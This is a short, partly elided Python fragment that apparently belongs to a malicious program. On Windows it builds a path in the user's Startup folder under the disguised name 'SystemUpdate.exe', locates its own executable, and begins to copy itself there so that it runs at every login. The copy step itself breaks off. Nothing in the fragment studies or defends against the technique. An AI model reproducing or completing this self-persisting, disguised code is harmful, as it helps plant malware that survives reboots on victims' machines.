        ...
        if platform.system() == "Windows":
            try:
                ...
                if appdata:
                    ...
                    dest_path = os.path.join(startup_dir, "SystemUpdate.exe")
                    
                    if getattr(sys, 'frozen', False):
                        curr_path = sys.executable
                    else:
                        curr_path = os.path.abspath(sys.argv[0])

                    # Avoid changing self if already in Startup
                    if os.path.abspath(curr_path).lower() != os.path.abspath(dest_path).lower():
                        import shutil
